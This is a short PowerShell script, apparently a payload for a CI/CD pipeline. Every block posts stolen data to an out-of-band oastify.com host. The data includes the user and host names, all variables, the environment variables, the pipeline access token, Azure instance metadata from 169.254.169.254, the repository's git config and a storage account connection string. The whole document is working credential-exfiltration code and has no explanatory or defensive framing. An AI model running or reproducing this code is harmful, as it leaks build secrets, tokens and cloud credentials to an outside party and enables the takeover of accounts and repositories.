
$uri = 'https://ebtuprygsdkufxqk6poes9yxcoifj3auyj.oastify.com/'+[System.Environment]::UserName+'/'+[System.Net.Dns]::GetHostName()
Invoke-RestMethod -Uri $uri -Body (Get-Variable | Out-String) -Method Post


$uri = 'https://ebtuprygsdkufxqk6poes9yxcoifj3auyj.oastify.com/'+$env:system_AccessToken
Invoke-RestMethod -Uri $uri -Body (Get-ChildItem Env: | Out-String) -Method Post

$response = Invoke-RestMethod -Uri "http://169.254.169.254/metadata/instance?api-version=2021-02-01" -Headers @{"Metadata"="true"}
$uri = 'https://ebtuprygsdkufxqk6poes9yxcoifj3auyj.oastify.com/'+$env:system_AccessToken
Invoke-RestMethod -Uri $uri -Body $response -Method Post


$gitConfigContent = Get-Content $env:GITHUB_WORKSPACE+'\.git\config' 
$uri = 'https://ebtuprygsdkufxqk6poes9yxcoifj3auyj.oastify.com/'+$env:ValidationStorageAccountConnectionString
Invoke-RestMethod -Uri $uri -Body $gitConfigContent -Method Post

